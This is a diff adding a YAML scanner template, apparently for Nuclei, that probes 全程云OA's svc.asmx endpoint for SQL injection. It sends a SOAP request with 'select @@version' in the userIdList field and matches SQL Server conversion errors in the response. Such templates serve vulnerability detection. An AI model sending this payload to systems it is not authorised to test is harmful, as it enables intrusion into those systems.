@@ -1,0 +1,42 @@
+id: poc-yaml-quan-cheng-yun-svc-asmx-sqli
+info:
+  name: 全程云OA svc.asmx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    A SQL injection vulnerability in 全程云OA's svc.asmx endpoint allows attackers to execute arbitrary SQL queries.
+    The issue arises due to insufficient sanitization of user-supplied input in the SOAP request.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/oa/pm/svc.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: "http://tempuri.org/GetUsersInfo"
+    body: |-
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
+      xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+      <GetUsersInfo xmlns="http://tempuri.org/">
+      <userIdList>select @@version</userIdList>
+      </GetUsersInfo>
+      </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "Microsoft SQL Server"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
